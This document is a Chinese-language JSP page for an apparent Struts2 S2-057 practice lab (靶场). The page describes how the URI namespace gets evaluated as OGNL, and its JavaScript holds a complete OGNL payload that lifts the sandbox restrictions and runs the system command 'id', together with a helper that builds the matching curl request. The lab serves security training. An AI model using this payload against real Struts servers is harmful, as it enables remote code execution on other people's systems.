<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-057 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea, .field input { width: 100%; box-sizing: border-box; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; color: #1d2a35; font: 14px/1.6 Consolas, monospace; }
        .field textarea { min-height: 160px; resize: vertical; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }

    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-057 演示靶场</h1>
        <p>当 <code>alwaysSelectFullNamespace=true</code> 且 action 未显式设置 namespace 时，URI 中的 namespace 片段会参与 OGNL 解析。</p>
        <p>当前 marker：<code><s:property value="marker"/></code></p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('math')">测试 ${233*233}</button>
            <button type="button" class="preset-btn" onclick="fillPreset('id')">执行 id</button>
            <button type="button" class="submit-btn" onclick="runPayload()">访问命名空间 Payload</button>
        </div>
        <div class="field">
            <label for="payloadBox">命名空间片段</label>
            <textarea id="payloadBox">${233*233}</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    const payloads = {
        math: '${233*233}',
        id: "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
    };
    function strictEncode(value) { return encodeURIComponent(value).replace(/[!'()*]/g, function(char) { return '%' + char.charCodeAt(0).toString(16).toUpperCase(); }); }
    function fillPreset(key) { document.getElementById('payloadBox').value = payloads[key]; refreshPreview(); }
    function buildUrl() { return strictEncode(document.getElementById('payloadBox').value) + '/actionChain1.action'; }
    function refreshPreview() { document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9949/' + buildUrl() + '"'; }
    function runPayload() { location.href = buildUrl(); }
    document.getElementById('payloadBox').addEventListener('input', refreshPreview); fillPreset('math');
</script>
</body>
</html>
